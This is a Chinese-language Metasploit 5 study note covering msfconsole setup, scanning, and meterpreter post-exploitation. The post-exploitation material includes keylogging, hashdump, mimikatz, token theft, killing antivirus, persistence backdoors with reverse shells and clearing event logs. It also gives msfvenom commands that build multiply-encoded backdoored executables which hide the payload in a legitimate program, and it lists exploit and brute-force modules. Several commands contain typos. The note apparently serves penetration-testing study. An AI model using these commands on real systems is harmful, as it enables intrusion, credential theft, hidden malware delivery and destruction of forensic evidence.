# Metaspolit5笔记


### 虚拟机网络

-   桥接模式：虚拟机就是一个单独的机子，没什么其他的限制。虚拟机和主机是通过 VMnet0 连接到外界的。有单独的 IP，可以随意和互联的任一主机通信。
-   NAT 模式：虚拟系统需要借助 NAT（网络地址转换）功能。通过主机所在的网络来访问公网。虚拟系统把主机作为路由器访问互联网。虚拟系统的 TCP/IP 信息由 VMnet8 的 DHCP 提供的，无法手工修改。因此，该局域网中的其他真实主机和虚拟机无法通行。
-   仅主机模式：所有的虚拟系统可以通信，但虚拟系统和真实系统是被隔离开的。虚拟系统和宿主主机是可以通信的，相当于这两台主机直接通过双绞线互联。

如果选择桥接模式，必须将“复制物理网络连接状态”勾上。否则，主机无法连接互联网。

## 配置 msfconsole 环境

```java
set Prompt value  //设置提示内容
set PromptTimeFormat value //设置时间格式
set PromptChar  //设置提示符
set TimestampOutput true //设置计时功能
set ConsoleLogging true //开日志，默认保存在/root/.msf4/logs/console.log
set SessionLogging true// 会话日志
set LogLevel 0//设置日志级别，默认是0，可设置为0、1、2、3，越大越详细
set MinimumRank 300 //设置模块默认级别，越大渗透越容易成功
```

## 漏洞扫描工具

-   Nessus（收费和免费）
-   OpenVAS（免费） 改名 gvm， 在 kali 安装`sudo apt install gvm*`

## 准备工作

-   添加工作区

    ```bash
    workspace  -a work1
    workspace #查看工作区
    ```

-   显示工作区详情

    ```bash
    workspace -v
    ```

-   切换工作区

## 确定目标主机

-   使用 db_nmap 扫描，命令和 nmap 一样

    ```bash
    db_namp 192.168.59.0/24
    ```

-   导入第三方报告

    ```bash
    db_import <filename> [file2...]
    ```

### 预分析目标

```bash
analyze [addr1 addr2 ...]
```

```bash
	hosts   #查看扫描结果中存在哪些主机
```

-   管理主机：hosts
-   管理服务：services
-   管理认证信息：creds
-   管理战利品：loot
-   管理备注信息：notes
-   查看漏洞信息：vulns

### 数据备份：db_export -f <format> [filename]

### 重建数据缓存

直接通过磁盘搜索模块很慢，为此 msf 在数据库中创建了对应的缓存。在添加删除模块的时候，需要更新数据库

```java
db_rebuild_cache
```

## 模块

```bash
show all #查看所有模块
show nops #查看nops类模块
search [关键字]#查找
show exploit#查看渗透攻击模块  exploit攻击
show auxiliary#查看辅助模块  run运行
show post #查看后渗透攻击模块
```

### 攻击载荷（payloads）

指用户希望对目标系统攻击成功后去执行的代码，在设置 exp 的时候设置 payload

### nops 模块

某些场合下，某些特殊的字符串会因为被拦截而导致攻击失效此时需要谢盖 exp 中的 nops。nops 会在 payload 生成时用到，php 的 nops 时返回指定长度的空格而已

### 编码模块

供 msfvenom 工具进行编码时使用

### 插件

```bash
load #查看插件加载方法
load -s #查看加载的插件
```

### 规避模块（evasion）

使用规避模块规避 windows defender 防火墙。

```bash
show evasion#查看规避模块
```

导入第三方模块

www.exploit-db.com

edit 可以编辑模块，修改代码

back 退出当前模块

set 设置，unset 重置，unset all 重置所有

setg 设置全局，unsetg 重置全局，save 保存全局设置

在对目标实施渗透攻击前，可以使用 check 命令检查当前目标主机是否支持漏洞攻击载荷，以及配置选项是否有效。并不是每个 exp 模块都支持 check

### 任务管理

```bash
jobs [选项]
jobs #查看后台运行的任务
kill 0 #结束id为0的任务
```

## 扩展功能

meterpreter 是 metasploit 框架的一个扩展模块对目标系统进行更为深入的渗透。

-   捕获屏幕：`screenshot`
-   捕获麦克风声音：`run sound_recoder`
-   捕获键盘记录：`run post/windows/capture/keylog_recorder`，也可以用`keyscan_dump`捕获键盘输入。先`keyscan_start`,再`keyscan_dump`,`keyscan_stop`停止捕获

### 提权

先查看当前权限等级

```bash
getuid#查看用户名
shell#进入powershell
net user bob#查看bob用户权限
exit #退出shell
getsystem#提权
```

### 挖掘用户名和密码

```bash
run post/windows/gather/hashdump#获取系统所有的用户名和密码哈希值，需要提权
```

### 传递哈希值

因破解哈希值难，传递就只需要哈希值就够了。

用 expoloit/windows/smb/psexec 模块实现哈希值传递

如果橙红入侵了某大型网络中的一台主机，在多数情况下，密码与其他主机通用。

###破解纯文本密码

```bash
load mimikatz
help #查看有效命令
msv#恢复哈希值密码
kerberos##类似msv，不同的是这可以看到使用哈希密码的原始密码
```

### 假冒令牌

假冒某个网络中的另一个用户进行各种操作。

```bash
ps#查看所有运行的程序及运行这些程序的用户，找到管理员运行的程序
steal_token PID#盗取管理员用户的令牌，此时已经成功了
```

incognito ：列出系统上可利用的令牌

```bash
use incognito
list_tokens -u
impersonater_token BENET \\domainadmin#BENET \domainadmin是上条命令显示的令牌之一，要输入两个\\
add_user abc password -h 192.168.1.104 #新建用户
```

只有 system 权限的用户可以查看所有令牌。

### 恢复文件

```bash
background #后台运行meterprete会话
use post/windows/gather/forensics/recovery_files
show options
set ...
run
```

### 通过跳板攻击其他机器

如果攻击者个跳板机在同一局域网中，可以保护攻击者。

### 使用 meterpreter 脚本

-   迁移进程：

    ```bash
    run post/windows/manage/migrate
    或
    migrate [PID号]
    ```

-   关闭杀毒软件

    ```bash
    run killav
    ```

-   获取系统密码哈希值

    ```bash
    run hashdump
    ```

-   查看目标机上的所有流量

    ```bash
    run packetrecorder -i 1   # -i 1指定网卡
    ```

-   获取系统信息

    scraper 脚本可以列举出用户想获取的任何信息，包括用户名密码、下载全部注册表、挖掘密码哈希值、收集系统信息

    ```bash
    run scraper
    ```

### 创建持久后门

metaspolit 自带的后门有两种启动方式

1. 通过服务启动（metsvc）
2. 通过启动项启动（persistence）

#### persistence

```bash
sessions -i 1 #激活meterpreter会话
run persistence -h #查看帮助
run persistence -X -i 50 -p 443 -r 192.168.1.104#创建一个持久后门
background
use multi/handler #监听，等待目标主机反向连接攻击主机
set payload windows/meterpreter/reverse_tcp
set ...
exploit
```

#### metsv

```bash
run metsvc -h #查看帮助
run metsvc -A

backgound
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set ...
exploit
```

### 将命令行 shell 升级为 meterpreter

exploit -z 会将成功攻击目标后获取的会话放在后台运行

sessions -u 1 将会话 1 升级为 meterpreter

sessions 查看所有会话

session -i 2 切换到 meterp 会话

### 清除踪迹

```bash
sessions -i 1#激活meterpreter
irb #开始清除踪迹
log = client.sys.eventlog.open('system')
log = client.sys.eventlog.open('application')
log = client.sys.eventlog.open('system')
log = client.sys.eventlog.open('system')
log = client.sys.eventlog.open('system')
log = client.sys.eventlog.open('system')
```

```bash
sessions -i 1#激活meterpreter
irb #开始清除踪迹
log = client.sys.eventlog.open('system') #设置想要删除的日志
log = client.sys.eventlog.open('application')
log = client.sys.eventlog.open('security')
log = client.sys.eventlog.open('directory service')
log = client.sys.eventlog.open('dns server')
log = client.sys.eventlog.open('file replication service')
log.clear #删除日志
----
#或者用clearev
clearev
```

## 使用 msf 攻击载荷生成器

使用 msfvenom 工具生成木马程序

1. 创建攻击载荷
2. 将生成的攻击载荷放到目标主机下执行，可以用 upload 命令上传
3. 在 msf 终端启动监听

## 免杀技术

### 多重编码

对可执行文件进行多次编码。shikata_ga_nai 编码时多态的，就是说每次生成的攻击载荷文件都不一样，通过 msfvenom 命令的选项-i 即可实现多重编码。

```bash
msfvenom -p windows/meterpreter/revers_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.108 LPORT=443 -f raw|msfvenom -a x86 --platform win -e x86/alpha_upper -i 2 -f exe -0 /root/payload.exe
```

### 自定义可执行文件模板

默认模板位于 data/msfpayload/template.exe 下，msfvenom 支持使用-x 选项使用任意的 windows 可执行程序来代替默认模板文件

```bash
msfvenom -p windows/meterpreter/revers_tcp -x muban.exe -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.108 LPORT=443 -f exe -o /root/backdoor.exe
```

### 隐秘启动一个攻击载荷

大多数情况下，当被估计的用户运行类似前面生成的包含后门的可执行文件时，如果什么也没发生会引起用户的怀疑。所以在启动攻击载荷的同时，可以让宿主程序页正常运行起来。

使用 msfvenom 的-k 选项，使攻击载荷在一个独立的线程中启动，这样宿主程序在执行时不会受到影响

```bash
msfvenom -p windows/meterpreter/revers_tcp -x muban.exe -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.108 LPORT=443 -f exe -k -o /root/backdoor.exe
```

-k 选项不一定能用在所有可执行程序上，所以要先确认

最好使用图形界面的程序。如果用命令行程序，会在目标主机上显示一个命令行窗口，这个窗口指导攻击载荷使用完毕才会消失。

### 加壳软件

这是一类对可执行文件进行加密压缩并将解压代码嵌入其中的工具。

kali 中最受欢迎的是 UPX 加壳软件

```bash
upx -5 payload.exe -q
```

# 漏洞利用

## windows 系统

### 远程溢出漏洞—CVE-2012-0002

```bash
search CVE-2012-0002
use ...
show options
set ...
exploit
```

### MS11-003(CVE-2001-0036)

### MS03-026(CVE-2003-0352)

### IE 浏览器的激光漏洞利用 (use exploit/windows/browser/ms10_002_aurora)

### 浏览器自动攻击模块（browser_autopwn）

### AdobeReader 漏洞（CVE-2010-1240）

## linux 系统

### Samba 服务 usermap_script 漏洞

### IRC 后台守护程序漏洞

### Samba 匿名共享目录可写入漏洞（samba_symlink_traversal）

### MySQL

1. 判断数据库是否允许外链

    使用 mysql_version 模块可以判断是否允许外链。如果允许则显示版本信息，否则不会显示版本信息。

2. 实施暴力破解密码

    使用 mysql_login 模块暴力破解密码。步骤如下：

    1. 创建密码字典
    2. 选择 mysql_login 模块，配置默认选项参数
    3. 实施暴力破解，exploit

3. 枚举数据库信息

    使用 mysql_enum 模块

4. 导出 hash 值并破解

    用 mysql_hashdump 模块，可以导出 MySQL 数据库用户的密码 hash 值。然后使用 jtr_mysql_fast 破解

5. MySQL 认证漏洞利用（CVE-2012-2122）

    使用 mysql_authbypass_hashdump

6. 利用 MOF 提权

    使用 mysql_mof 模块提权，是针对安装在 Windows 下的 MySQL 实施的。

## 网站

### 攻击 Tomcat 服务

-   利用 tomcat_mgr_login
-   利用 tomcat_mgr_deploy

### CVE-2010-0425 漏洞

### WebDVA

使用 webdva_scanner

### Oracle Java SE 远程拒绝服务漏洞（CVE-2012-0507）

### Java 零日漏洞（CVE-2012-4681）

利用 java_jre17_exec

## 通用功能

### 端口扫描

```bash
search portscan
use ...
set ...
run
```

### 服务版本扫描

ftp_version,ssh_version,http_version

### 扫描服务弱口令

以 postgresql 为例

```bash
search postgresql
use ../postgres_login
set ...
exploit
```

# 复制功能

## 连接主机

```bash
connect [选项]
```

## 批处理

```bash
resource path1 [path2...]
```

资源文件以`.rc`结尾.

### 会话管理

sessions 可以列出，进入交互和杀死大量的会话。

